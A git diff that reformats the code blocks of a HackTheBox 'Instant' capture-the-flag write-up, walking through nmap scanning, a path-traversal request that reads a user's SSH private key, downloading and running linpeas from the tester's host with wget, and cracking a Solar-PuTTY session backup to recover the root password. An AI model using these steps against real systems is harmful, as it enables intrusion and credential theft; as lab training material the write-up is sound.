@@ -11,21 +11,21 @@ opsystem : "Linux"
 # HackTheBox - Instant
 
 ### Reconnaisance & Information Gathering
-```
-┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ sudo nmap -Pn -sV instant.htb
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:56 WIB
-Nmap scan report for instant.htb (10.10.11.37)
-Host is up (0.058s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.58
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds
-```
+    ┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ sudo nmap -Pn -sV instant.htb
+    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:56 WIB
+    Nmap scan report for instant.htb (10.10.11.37)
+    Host is up (0.058s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    Apache httpd 2.4.58
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds
+
 First, we scan the machine with nmap to discover open ports and running services. There are two open ports in this machine, 22 (ssh) and 80 (http).
 
 ![image](https://github.com/user-attachments/assets/f16a1c1f-7ee6-443f-9383-04e4cc8c6f03)
@@ -38,9 +38,8 @@ We can do reverse engineering to disassemble instant application. With reverse e
 > JADX GUI is an open-source tool designed for decompiling Android applications, allowing users to convert APK files into readable Java code. It is widely used by security researchers and developers for analyzing and understanding the inner workings of Android apps.
 
 We can run jadx with command :
-```
-$ jadx-gui
-```
+
+    $ jadx-gui
 
 ![image](https://github.com/user-attachments/assets/3d2561d8-3f90-44e7-90d6-c5f244ffb30d)
 
@@ -107,29 +106,24 @@ Try /view/logs endpoint to list all available logs. This endpoint doesn't requir
 
 ![image](https://github.com/user-attachments/assets/7d6a7e47-2939-49a3-bd76-e95684a88d5d)
 
-
-```
-{
-  "Files": [
-    "1.log"
-  ],
-  "Path": "/home/shirohige/logs/",
-  "Status": 201
-}
-```
+    {
+      "Files": [
+        "1.log"
+      ],
+      "Path": "/home/shirohige/logs/",
+      "Status": 201
+    }
 
 There is 1.log file on /home/shirohige/logs. We can read the content of 1.log file using /read/log endpoint. Fill the log_file_name parameter with the log file name that we obtained previously (1.log)
 
 ![image](https://github.com/user-attachments/assets/b29bb5c3-3b2a-4444-a94b-a9e40f428a26)
 
-```
-{
-  "/home/shirohige/logs/1.log": [
-    "This is a sample log testing\n"
-  ],
-  "Status": 201
-}
-```
+    {
+      "/home/shirohige/logs/1.log": [
+        "This is a sample log testing\n"
+      ],
+      "Status": 201
+    }
 
 The /read/log endpoint works by reading log files in the /home/shirohige/logs/ directory. Then we need to enter the log name parameter (1.log) to read the log file. So enpoint will read the file /home/shirohige/logs/1.log.
 
@@ -153,39 +147,33 @@ Try to grab the id_rsa file in shirohige home directory so we can log in via ssh
 
 ![image](https://github.com/user-attachments/assets/1c351fca-a379-4998-9015-4571624df9e0)
 
-```
-{
-  "/home/shirohige/logs/../.ssh/id_rsa": [
-    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
-    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n",
-    ....
-    "5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n",
-    "bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n",
-    "-----END OPENSSH PRIVATE KEY-----\n"
-  ],
-  "Status": 201
-}
-```
+    {
+      "/home/shirohige/logs/../.ssh/id_rsa": [
+        "-----BEGIN OPENSSH PRIVATE KEY-----\n",
+        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n",
+        ....
+        "5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n",
+        "bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n",
+        "-----END OPENSSH PRIVATE KEY-----\n"
+      ],
+      "Status": 201
+    }
 
 > An SSH key (id_rsa) is an access credential in the SSH protocol. Its function is similar to that of user names and passwords, but the keys are primarily used for automated processes and for implementing single sign-on by system administrators and power users.
 
 Save the id_rsa file into our machine. Don't forget to change the permissions (chmod 600) of the id_rsa file so it can be used to log in. Then try to log in as shirohige using that key.
 
-```
-chmod 600 id_rsa
-ssh -i id_rsa shirohige@10.10.11.37
-```
+    chmod 600 id_rsa
+    ssh -i id_rsa shirohige@10.10.11.37
 
 ![image](https://github.com/user-attachments/assets/a82b665c-dfc0-445d-95a8-5f053ce1c8a5)
 
 We are logged in as user (shirohige). Now we can grab the user flag.
 
-```
-shirohige@instant:~$ ls
-logs  projects  user.txt
-shirohige@instant:~$ cat user.txt
-e73582b110fe100dxxxxxxx
-```
+    shirohige@instant:~$ ls
+    logs  projects  user.txt
+    shirohige@instant:~$ cat user.txt
+    e73582b110fe100dxxxxxxx
 
 ### Privilege Escalation to Root
 We can use linpeas to look for gap that we can exploit to escalate the privilege.
@@ -193,66 +181,57 @@ We can use linpeas to look for gap that we can exploit to escalate the privilege
 > [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
 
 Create a python http server on linpeas directory in our machine.
-```
-┌──(blackcat㉿threatactor)-[/]
-└─$ linpeas
 
-> peass ~ Privilege Escalation Awesome Scripts SUITE
+    ┌──(blackcat㉿threatactor)-[/]
+    └─$ linpeas
 
-/usr/share/peass/linpeas
-├── linpeas.sh
-├── linpeas_darwin_amd64
-├── ....
+    > peass ~ Privilege Escalation Awesome Scripts SUITE
 
-┌──(blackcat㉿threatactor)-[/usr/share/peass/linpeas]
-└─$ python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
+    /usr/share/peass/linpeas
+    ├── linpeas.sh
+    ├── linpeas_darwin_amd64
+    ├── ....
+
+    ┌──(blackcat㉿threatactor)-[/usr/share/peass/linpeas]
+    └─$ python3 -m http.server 8000
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 Then download linpeas using wget from target machine.
 
-```
-shirohige@instant:~$ wget http://10.10.14.55:8000/linpeas.sh
---2025-01-04 09:38:05--  http://10.10.14.55:8000/linpeas.sh
-Connecting to 10.10.14.55:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 824847 (806K) [text/x-sh]
-Saving to: ‘linpeas.sh’
+    shirohige@instant:~$ wget http://10.10.14.55:8000/linpeas.sh
+    --2025-01-04 09:38:05--  http://10.10.14.55:8000/linpeas.sh
+    Connecting to 10.10.14.55:8000... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 824847 (806K) [text/x-sh]
+    Saving to: ‘linpeas.sh’
 
-linpeas.sh                100%[====================================>] 805.51K  2.98MB/s    in 0.3s    
+    linpeas.sh                100%[====================================>] 805.51K  2.98MB/s    in 0.3s    
 
-2025-01-04 09:38:06 (2.98 MB/s) - ‘linpeas.sh’ saved [824847/824847]
+    2025-01-04 09:38:06 (2.98 MB/s) - ‘linpeas.sh’ saved [824847/824847]
 
-shirohige@instant:~$ ls
-linpeas.sh  logs  projects  user.txt
-shirohige@instant:~$ 
-```
+    shirohige@instant:~$ ls
+    linpeas.sh  logs  projects  user.txt
+    shirohige@instant:~$ 
 
 Run linpeas.
 
-```
-shirohige@instant:~$ chmod +x linpeas.sh
-shirohige@instant:~$ ./linpeas.sh
-```
+    shirohige@instant:~$ chmod +x linpeas.sh
+    shirohige@instant:~$ ./linpeas.sh
 
 ![image](https://github.com/user-attachments/assets/744bd386-63b4-4343-b087-3efa002ff3ed)
 
 We got some interesting writable file in /opt directory owned by shirohige user.
 
-```
-╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
-/opt/backups
-/opt/backups/Solar-PuTTY
-/opt/backups/Solar-PuTTY/sessions-backup.dat
-```
+    ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+    /opt/backups
+    /opt/backups/Solar-PuTTY
+    /opt/backups/Solar-PuTTY/sessions-backup.dat
 
 We also got the same results in backup files section.
 
-```
-╔══════════╣ Backup files (limited 100)
--rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat
-```
+    ╔══════════╣ Backup files (limited 100)
+    -rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat
 
 > SolarWinds® Solar-PuTTY is a standalone free terminal emulator and network file transfer tool based on the well-known PuTTY for Windows®. It supports a wide range of network protocols, including SSH, Telnet, SCP, or SFTP. Solar-PuTTY keeps all advantages of the original PuTTY and enhances it with plenty of highly acclaimed new features. [solarwinds.com](https://www.solarwinds.com/assets/solarwinds/swdcv2/free-tools/solar-putty/resources/solar-putty-datasheet.pdf)
 >
@@ -262,49 +241,44 @@ We found Solar-PuTTY sessions files. We can decrypt it using this script [https:
 
 Copy sessions-backup.dat files into our machine. Create a python virtual enviromnent and install required packages using pip.
 
-```
-┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ scp -i id_rsa shirohige@10.10.11.37:/opt/backups/Solar-PuTTY/sessions-backup.dat sessions-backup.dat 
-sessions-backup.dat  100% 1100    22.7KB/s   00:00
+    ┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ scp -i id_rsa shirohige@10.10.11.37:/opt/backups/Solar-PuTTY/sessions-backup.dat sessions-backup.dat 
+    sessions-backup.dat  100% 1100    22.7KB/s   00:00
 
-┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ python3 -m venv solarputty-env                                                   
-                                                                                                                                                                                                                               
-┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ source solarputty-env/bin/activate                                                                 
-                                                                                                                                                                                                                               
-┌──(solarputty-env)─(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ pip install cryptography pycryptodome                                               
-Collecting cryptography
-  Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)
-Collecting pycryptodome
-  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
-....
-....
-Installing collected packages: pycryptodome, pycparser, cffi, cryptography
-Successfully installed cffi-1.17.1 cryptography-44.0.0 pycparser-2.22 pycryptodome-3.21.0
-```
+    ┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ python3 -m venv solarputty-env
+
+    ┌──(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ source solarputty-env/bin activate
+
+    ┌──(solarputty-env)─(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ pip install cryptography pycryptodome                                               
+    Collecting cryptography
+      Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)
+    Collecting pycryptodome
+      Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
+    ....
+    ....
+    Installing collected packages: pycryptodome, pycparser, cffi, cryptography
+    Successfully installed cffi-1.17.1 cryptography-44.0.0 pycparser-2.22 pycryptodome-3.21.0
 
 Run the script and solar putty sessions file decrypted.
-```
-┌──(solarputty-env)─(blackcat㉿threatactor)-[~/Desktop/htb-instant]
-└─$ python3 SolarPuttyDecrypt.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
-[103] password='estrella'           
 
-{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
-```
+    ┌──(solarputty-env)─(blackcat㉿threatactor)-[~/Desktop/htb-instant]
+    └─$ python3 SolarPuttyDecrypt.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
+    [103] password='estrella'           
+
+    {"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
 
 We can use the password from decrypted solar putty sessions file to login as root. Don't forget to grab the root flag. Machine pwnd :3
 
-```
-shirohige@instant:~$ su root
-Password: 
-root@instant:/home/shirohige# cd
-root@instant:~# id
-uid=0(root) gid=0(root) groups=0(root)
-root@instant:~# ls
-root.txt
-root@instant:~# cat root.txt
-1b78a865599a42xxxxxxxxxxxxxxxxx
-root@instant:~# 
-```
+    shirohige@instant:~$ su root
+    Password: 
+    root@instant:/home/shirohige# cd
+    root@instant:~# id
+    uid=0(root) gid=0(root) groups=0(root)
+    root@instant:~# ls
+    root.txt
+    root@instant:~# cat root.txt
+    1b78a865599a42xxxxxxxxxxxxxxxxx
+    root@instant:~# 
